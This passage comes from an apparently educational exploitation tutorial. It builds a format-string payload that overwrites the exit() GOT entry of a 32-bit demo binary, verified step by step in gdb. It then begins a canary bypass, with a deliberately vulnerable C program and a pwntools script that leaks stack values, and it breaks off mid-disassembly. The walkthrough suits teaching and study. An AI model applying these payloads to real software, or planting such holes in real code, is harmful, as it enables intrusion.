<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"%6$134517049x"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"%6$n"</span>

<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">buffer</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</pre></div>
<p>As observed, I replaced the string "BBBB" with the address of <code>exit()</code> in the GOT, incremented by two bytes. This new address now occupies position 7, where the previous characters were located.</p><br/>
<p>Now, instead of writing <code>134517049</code> bytes to the address located at position 6, we only need to write <code>37302</code> (<code>0x91b6</code> in hexadecimal). This adjustment ensures that the GOT entry now points to the address <code>0x000091b6</code>.</p><br/>
<div class="highlight"><pre><span></span><span class="n">payload</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">b</span><span class="s">"%x "</span><span class="o">*</span><span class="mi">15</span><span class="w"></span>
<span class="n">payload</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">b</span><span class="s">"%6$37302x"</span><span class="w"></span>
<span class="n">payload</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">b</span><span class="s">"%6$n"</span><span class="w"></span>
</pre></div>
<p>Before overwriting the remaining two bytes, let's verify that we're doing it correctly. To do so, let's execute the program inside <code>gdb</code>.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">run</span> <span class="o">&lt;&lt;&lt;</span> <span class="s2">"$(python exploit.py)"</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="o">.</span>
<span class="mh">0x00009232</span> <span class="ow">in</span> <span class="n">??</span> <span class="p">()</span>
<span class="nd">gef$</span>
</pre></div>
<p>Something went wrong. We should be redirected to address <code>0x000091b6</code>, not <code>0x00009232</code>.</p><br/>
<p>Oh, we forgot that before adding that padding of <code>37302</code> bytes, we're printing additional bytes. Let's perform a calculation to determine how many characters we need to subtract from that value.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python</span>
<span class="n">Python</span> <span class="mf">3.10.12</span> <span class="p">(</span><span class="n">main</span><span class="p">,</span> <span class="n">Nov</span> <span class="mi">20</span> <span class="mi">2023</span><span class="p">,</span> <span class="mi">15</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">05</span><span class="p">)</span> <span class="p">[</span><span class="n">GCC</span> <span class="mf">11.4.0</span><span class="p">]</span> <span class="n">on</span> <span class="n">linux</span>
<span class="n">Type</span> <span class="s2">"help"</span><span class="p">,</span> <span class="s2">"copyright"</span><span class="p">,</span> <span class="s2">"credits"</span> <span class="ow">or</span> <span class="s2">"license"</span> <span class="k">for</span> <span class="n">more</span> <span class="n">information</span><span class="o">.</span>
<span class="o">&gt;&gt;&gt;</span> <span class="mh">0x9232</span><span class="o">-</span><span class="mh">0x91b6</span>
<span class="mi">124</span>
<span class="o">&gt;&gt;&gt;</span> <span class="mh">0x91b6</span><span class="o">-</span><span class="mi">124</span>
<span class="mi">37178</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">exit</span><span class="p">()</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>Based on the initial result, we determined that <code>124</code> characters are added before our padding. Therefore, to reach the target value of <code>0x91b6</code>, we need to subtract <code>124</code> from this value. This ensures that when we add the correct padding, we will not exceed the desired value.</p><br/>
<p>Let's modify our exploit:</p><br/>
<div class="highlight"><pre><span></span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="si">%x</span><span class="s2"> "</span><span class="o">*</span><span class="mi">15</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"%6$37178x"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"%6$n"</span>
</pre></div>
<p>Great! Let's execute the binary again and pass the new payload with the modified padding:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">run</span> <span class="o">&lt;&lt;&lt;</span> <span class="s2">"$(python exploit.py)"</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="o">.</span>
<span class="mh">0x000091b6</span> <span class="ow">in</span> <span class="n">??</span> <span class="p">()</span>
<span class="nd">gef$</span>
</pre></div>
<p>Perfect! Now it works correctly. We've successfully reached the desired address. Next, we simply fill the two remaining bytes with the value <code>0x0804</code>, completing the GOT entry with the address of the <code>target</code> function.</p><br/>
<p>By placing the new address where the <code>BBBB</code> string was previously, we determine that the address pointing to the two preceding bytes at the start of the GOT entry for <code>exit()</code> is now located at position 7.</p><br/>
<p>I'll simply add this line to our payload to check if we can overwrite those two remaining bytes:</p><br/>
<div class="highlight"><pre><span></span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"%7$n"</span>
</pre></div>
<p>Let's execute the program:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">run</span> <span class="o">&lt;&lt;&lt;</span> <span class="s2">"$(python exploit.py)"</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="o">.</span>
<span class="mh">0x91b691b6</span> <span class="ow">in</span> <span class="n">??</span> <span class="p">()</span>
<span class="nd">gef$</span>
</pre></div>
<p>Well, it works. We're successfully overwriting the two remaining bytes. However, as observed, we're replacing them with a value higher than the desired one. As mentioned earlier, our goal is to overwrite those two bytes with the value <code>0x0804</code>. How can we achieve this value if we can only write a much higher value?</p><br/>
<p>As mentioned earlier, memory addresses are 4 bytes long in a 32-bit architecture. Therefore, when we overwrite the two remaining bytes with the value <code>0x91b6</code>, what actually happens is that we overwrite them with <code>0x000091b6</code>. This means that in addition to writing our desired value, <code>0x91b6</code>, into the specified location, we unintentionally overwrite the two bytes to the left of it. Essentially, we overwrite 2 bytes at the desired location with <code>0x91b6</code>, but the remaining 2 bytes are also overwritten, affecting adjacent memory locations to the left.</p><br/>
<p>But how does this help us achieve our goal? Our objective is to set the value <code>0x0804</code> in the two remaining bytes of the GOT entry. Currently, though, we are overwriting them with a higher value. One workaround is to overwrite them with an even higher value, such as <code>0x10804</code>. This operation will result in the two remaining bytes containing the <code>0x0804</code> part we need, while the excess byte spills over into adjacent memory locations on the left. In doing so, we effectively reach our desired value of <code>0x0804</code> despite the initial overwrite.</p><br/>
<p>In essence, when we overwrite the first two bytes with <code>0x91b6</code>, the subsequent overwrite also affects the remaining two bytes with the same value <code>0x91b6</code>. This occurs because the format specifier counts how many characters were printed before it, and since we haven't added more characters, the value remains unchanged. To achieve our target value of <code>0x10804</code>, which is higher than <code>0x91b6</code>, we need to calculate the difference between <code>0x10804</code> and <code>0x91b6</code>. This difference tells us how much padding we must add to the initial overwrite. Specifically, subtracting <code>0x91b6</code> from <code>0x10804</code> gives us the amount of padding required to reach the desired location starting from <code>0x91b6</code>.</p><br/>
<p>Let's perform the operation:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python</span>
<span class="n">Python</span> <span class="mf">3.10.12</span> <span class="p">(</span><span class="n">main</span><span class="p">,</span> <span class="n">Nov</span> <span class="mi">20</span> <span class="mi">2023</span><span class="p">,</span> <span class="mi">15</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">05</span><span class="p">)</span> <span class="p">[</span><span class="n">GCC</span> <span class="mf">11.4.0</span><span class="p">]</span> <span class="n">on</span> <span class="n">linux</span>
<span class="n">Type</span> <span class="s2">"help"</span><span class="p">,</span> <span class="s2">"copyright"</span><span class="p">,</span> <span class="s2">"credits"</span> <span class="ow">or</span> <span class="s2">"license"</span> <span class="k">for</span> <span class="n">more</span> <span class="n">information</span><span class="o">.</span>
<span class="o">&gt;&gt;&gt;</span> <span class="mh">0x10804</span><span class="o">-</span><span class="mh">0x91b6</span>
<span class="mi">30286</span>
<span class="o">&gt;&gt;</span> <span class="n">exit</span><span class="p">()</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>The result of the operation is <code>30286</code>. This represents the number of padding characters we need to input in order to achieve the desired value <code>0x10804</code>. </p><br/>
<p>This is the final payload:</p><br/>
<div class="highlight"><pre><span></span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">exit_got</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s2">"little"</span><span class="p">)</span> <span class="c1"># Convert to little-endian</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="p">(</span><span class="n">exit_got</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s2">"little"</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"CCCC"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="si">%x</span><span class="s2"> "</span><span class="o">*</span><span class="mi">15</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"%6$37178x"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"%6$n"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"%7$30286x"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"%7$n"</span>
</pre></div>
<p>As observed, I've added two lines after the initial overwrite. First, it prints the value at location 7, padding it to reach <code>30286</code> characters. Then, I've included <code>%7$n</code>, which accesses the value at position 7 (representing the address of the GOT entry for <code>exit()</code> + 2 bytes) and uses it as a pointer to store the count of printed characters.</p><br/>
<p>Let's execute the program and pass the new payload:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">run</span> <span class="o">&lt;&lt;&lt;</span> <span class="s2">"$(python exploit.py)"</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="n">Congratulations</span><span class="p">,</span> <span class="n">you</span><span class="n">'ve successfully solved this challenge!</span>
<span class="p">[</span><span class="n">Inferior</span> <span class="mi">1</span> <span class="p">(</span><span class="n">process</span> <span class="mi">33439</span><span class="p">)</span> <span class="n">exited</span> <span class="k">with</span> <span class="n">code</span> <span class="mi">01</span><span class="p">]</span>
<span class="nd">gef$</span>
</pre></div>
<p>Great! It worked. We've successfully overwritten the GOT entry for <code>exit()</code> and executed an arbitrary function by exploiting the format string vulnerability.</p><br/>
<p>It also works outside of GDB:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">.</span><span class="o">/</span>program</span> <span class="o">&lt;&lt;&lt;</span> <span class="s2">"$(python exploit.py)"</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="n">Congratulations</span><span class="p">,</span> <span class="n">you</span><span class="n">'ve successfully solved this challenge!</span>
<span class="nd">elswix@ubuntu$</span></pre></div>
<br/><h2>Buffer Overflow - Stack Canary protection bypass:</h2><br/>
<h3>Leaking Canary value from the stack through a Format String Vulnerability</h3><br/>
<p>Now, instead of leveraging the format string vulnerability to achieve memory overwriting, we'll abuse it to leak values from the stack. In previous articles, we have seen that when exploiting a buffer overflow, there are several protections that prevent us from achieving our goal. One of these protections is the <a href="https://elswix.github.io/articles/4/binary-protections.html">Stack Canary</a> protection. This involves generating a random value, placing it on the stack, and then checking whether this value has been overwritten when the function returns. If the value is overwritten due to triggering the buffer overflow, the program will crash before the function returns, and an error message will indicate that the stack has been smashed. This halts the program execution for security reasons.</p><br/>
<p>However, by exploiting a format string vulnerability, we can attempt to leak this generated value. Then, when triggering the buffer overflow, we can place that leaked value in its corresponding location, thereby avoiding overwriting it with arbitrary data. This ensures that even if the stack is smashed, the instruction that checks whether this value is equal to the initial one will succeed (indicating that there was no overwriting).</p><br/>
<p>On Linux, stack canaries end in <code>00</code>. This information is useful because the stack stores numerous values and addresses, although many of these values do not follow the same pattern. Additionally, the stack canary remains in the same position with each execution. For example, if you identify the stack canary at position 18 using the payload <code>%18$x</code>, it means you can use the same payload in every execution to leak the canary value.</p><br/>
<br/><h2>Exploitation</h2><br/>
<p>I won't delve into the Buffer Overflow exploitation step-by-step; instead, I'll simply demonstrate how to leak the stack canary value and use it to manipulate the stack without triggering Stack Smashing protection. Afterward, we'll execute a ret2libc attack by leaking the libc address and calculating the desired address using the corresponding offset. I've already demonstrated how to execute this attack in detail in this <a href="https://elswix.github.io/articles/8/return-2-libc.html">article</a>.</p><br/>
<p>Vulnerable program:</p><br/>
<div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="kt">void</span><span class="w"> </span><span class="nf">vuln</span><span class="p">(){</span><span class="w"></span>

<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">username</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span><span class="w"></span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">password</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span><span class="w"></span>

<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"Please, enter your username: </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"-&gt; "</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">fgets</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">username</span><span class="p">),</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span><span class="w"></span>

<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"Enter password for "</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="n">username</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"-&gt; "</span><span class="p">);</span><span class="w"></span>

<span class="w">    </span><span class="n">fgets</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="mi">200</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="s">"admin</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">strcmp</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="s">"admin123</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">"Access granted!"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">else</span><span class="w"></span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">"Access denied!"</span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(){</span><span class="w"></span>
<span class="w">    </span><span class="n">vuln</span><span class="p">();</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span>
<span class="p">}</span><span class="w"></span>
</pre></div>
<p>As observed, the program contains both a format string vulnerability and a buffer overflow vulnerability. Initially, the program prompts the user for a username, then it prints the entered value back. The issue arises from passing user-controllable data as the format parameter (first parameter) to <code>printf()</code>. </p><br/>
<p>Then, the program prompts the user for a password. The issue arises when reading user input: it reads more characters than the allocated buffer (<code>password</code>) can store. Consequently, if the user enters more than 50 characters (the allocated buffer size), a buffer overflow will occur.</p><br/>
<p>Let's compile this program using <code>gcc</code> with the <code>-no-pie</code> and <code>-m32</code> parameters.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">gcc</span> <span class="n">program</span><span class="o">.</span><span class="n">c</span> <span class="o">-</span><span class="n">o</span> <span class="n">program</span> <span class="o">-</span><span class="n">m32</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="n">pie</span>
</pre></div>
<p>Ignore the warnings; they are simply alerting you to the Format String Vulnerability and the Buffer Overflow.</p><br/>
<p>Let's execute the program:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="o">./</span><span class="n">program</span>
<span class="n">Please</span><span class="p">,</span> <span class="n">enter</span> <span class="n">your</span> <span class="n">username</span><span class="p">:</span> 
<span class="o">-&gt;</span> <span class="n">elswix</span>
<span class="n">Enter</span> <span class="n">password</span> <span class="k">for</span> <span class="n">elswix</span>
<span class="o">-&gt;</span> <span class="n">elswix123</span>
<span class="n">Access</span> <span class="n">denied</span><span class="n">!</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>It works properly. Now, let's see if we can trigger a format string vulnerability and a buffer overflow:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="o">./</span><span class="n">program</span>
<span class="n">Please</span><span class="p">,</span> <span class="n">enter</span> <span class="n">your</span> <span class="n">username</span><span class="p">:</span> 
<span class="o">-&gt;</span> <span class="o">%</span><span class="n">x</span>
<span class="n">Enter</span> <span class="n">password</span> <span class="k">for</span> <span class="mi">32</span>
<span class="o">-&gt;</span> <span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
<span class="o">***</span> <span class="n">stack</span> <span class="n">smashing</span> <span class="n">detected</span> <span class="o">***</span><span class="p">:</span> <span class="n">terminated</span>
<span class="n">zsh</span><span class="p">:</span> <span class="n">IOT</span> <span class="n">instruction</span> <span class="p">(</span><span class="n">core</span> <span class="n">dumped</span><span class="p">)</span>  <span class="o">./</span><span class="n">program</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>It worked! We can leak values from the stack through the Format String Vulnerability, and we can trigger a buffer overflow. Nice!</p><br/>
<h3>Finding stack canary value on the stack</h3><br/>
<p>To determine the position where the stack canary resides in the stack (as a parameter for <code>printf()</code>), I'll create a Python script that executes the program multiple times in a for loop, passing a different position each time.</p><br/>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> 

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">51</span><span class="p">):</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">"./program"</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s2">"error"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s2">"%</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">$x"</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
</pre></div>
<p>This script will execute the program multiple times, passing a different position in each execution. Let's run it:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
<span class="sa">b</span><span class="s1">'-&gt; Enter password for 32</span><span class="se">\n</span><span class="s1">'</span>
<span class="sa">b</span><span class="s1">'-&gt; Enter password for e9226620</span><span class="se">\n</span><span class="s1">'</span>
<span class="sa">b</span><span class="s1">'-&gt; Enter password for 80491c2</span><span class="se">\n</span><span class="s1">'</span>
<span class="sa">b</span><span class="s1">'-&gt; Enter password for 0</span><span class="se">\n</span><span class="s1">'</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">..</span>
<span class="sa">b</span><span class="s1">'-&gt; Enter password for ffea044e</span><span class="se">\n</span><span class="s1">'</span>
<span class="sa">b</span><span class="s1">'-&gt; Enter password for ff83345d</span><span class="se">\n</span><span class="s1">'</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>Great! Our format string works, and it is leaking values from the stack. However, our script is printing the entire line. I prefer to extract only the leaked value, so I'll process the output accordingly:</p><br/>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> 

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">51</span><span class="p">):</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">"./program"</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s2">"error"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s2">"%</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">$x"</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">leaked_value</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">" "</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"POS </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2"> -&gt; "</span> <span class="o">+</span> <span class="n">leaked_value</span><span class="p">)</span>
</pre></div>
<p>Now the script will only display the leaked value along with its corresponding position:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
<span class="n">POS</span> <span class="mi">1</span> <span class="o">-&gt;</span> <span class="mi">32</span>
<span class="n">POS</span> <span class="mi">2</span> <span class="o">-&gt;</span> <span class="n">e9e26620</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">..</span>
<span class="n">POS</span> <span class="mi">46</span> <span class="o">-&gt;</span> <span class="mi">1</span>
<span class="n">POS</span> <span class="mi">47</span> <span class="o">-&gt;</span> <span class="n">ff90bd24</span>
<span class="n">POS</span> <span class="mi">48</span> <span class="o">-&gt;</span> <span class="n">f2626000</span>
<span class="n">POS</span> <span class="mi">49</span> <span class="o">-&gt;</span> <span class="n">ffa5e6b4</span>
<span class="n">POS</span> <span class="mi">50</span> <span class="o">-&gt;</span> <span class="n">f42c9b80</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>Great! Now, thanks to this processed output, we can apply filters to search for specific values. As mentioned earlier, the canary value always ends in <code>00</code>. Therefore, we can use the <code>grep</code> command to apply that filter.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="o">|</span> <span class="n">grep</span> <span class="s2">"00$"</span>
<span class="n">POS</span> <span class="mi">18</span> <span class="o">-&gt;</span> <span class="mi">1000000</span>
<span class="n">POS</span> <span class="mi">31</span> <span class="o">-&gt;</span> <span class="mf">45e23</span><span class="n">e00</span>
<span class="n">POS</span> <span class="mi">33</span> <span class="o">-&gt;</span> <span class="n">ede26000</span>
<span class="n">POS</span> <span class="mi">44</span> <span class="o">-&gt;</span> <span class="n">eb826000</span>
<span class="n">POS</span> <span class="mi">48</span> <span class="o">-&gt;</span> <span class="n">f3e26000</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>Well, there are many values that end in <code>00</code>. After executing the script multiple times, you may notice that some positions no longer appear, and some of them are static, so you can start discarding those. Additionally, some of the values that are displayed always end with <code>000</code>. Sometimes the stack canary may end with <code>000</code>, but it's not very common and won't always end in <code>000</code>, so you can discard those as well.</p><br/>
<p>After executing the script multiple times and applying the new filters, you will notice that only positions <code>31</code> and <code>59</code> consistently match our criteria.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="o">|</span> <span class="n">grep</span> <span class="s2">"00$"</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">v</span> <span class="s2">"000"</span>
<span class="n">POS</span> <span class="mi">31</span> <span class="o">-&gt;</span> <span class="mi">3</span><span class="n">b824d00</span>
</pre></div>
<p>Let's verify if this value belongs to the Stack Canary. Firstly, let's use GDB to perform a thorough examination:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">gdb</span> <span class="o">-</span><span class="n">q</span> <span class="n">program</span>
<span class="n">GEF</span> <span class="k">for</span> <span class="n">linux</span> <span class="n">ready</span><span class="p">,</span> <span class="nb">type</span> <span class="n">`</span><span class="n">gef</span><span class="s1">' to start, `gef config'</span> <span class="n">to</span> <span class="n">configure</span>
<span class="mi">88</span> <span class="n">commands</span> <span class="n">loaded</span> <span class="ow">and</span> <span class="mi">5</span> <span class="n">functions</span> <span class="n">added</span> <span class="k">for</span> <span class="n">GDB</span> <span class="mf">12.1</span> <span class="ow">in</span> <span class="mf">0.01</span><span class="n">ms</span> <span class="n">using</span> <span class="n">Python</span> <span class="n">engine</span> <span class="mf">3.10</span>
<span class="n">Reading</span> <span class="n">symbols</span> <span class="kn">from</span> <span class="nn">program...</span>
<span class="p">(</span><span class="n">No</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span> <span class="ow">in</span> <span class="n">program</span><span class="p">)</span>
<span class="nd">gef$</span>
</pre></div>
<p>We know that the <code>vuln</code> function is where the vulnerable functionalities are implemented. Let's disassemble it:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">disas</span> <span class="n">vuln</span>
<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="n">vuln</span><span class="p">:</span>
   <span class="mh">0x080491b6</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>     <span class="n">push</span>   <span class="n">ebp</span>
   <span class="mh">0x080491b7</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>     <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
   <span class="mh">0x080491b9</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">:</span>     <span class="n">push</span>   <span class="n">ebx</span>
   <span class="mh">0x080491ba</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">:</span>     <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x74</span>
   <span class="mh">0x080491bd</span> <span class="o">&lt;+</span><span class="mi">7</span><span class="o">&gt;</span><span class="p">:</span>     <span class="n">call</span>   <span class="mh">0x80490f0</span> <span class="o">&lt;</span><span class="n">__x86</span><span class="o">.</span><span class="n">get_pc_thunk</span><span class="o">.</span><span class="n">bx</span><span class="o">&gt;</span>
   <span class="mh">0x080491c2</span> <span class="o">&lt;+</span><span class="mi">12</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">add</span>    <span class="n">ebx</span><span class="p">,</span><span class="mh">0x2e3e</span>
   <span class="mh">0x080491c8</span> <span class="o">&lt;+</span><span class="mi">18</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">gs</span><span class="p">:</span><span class="mh">0x14</span>
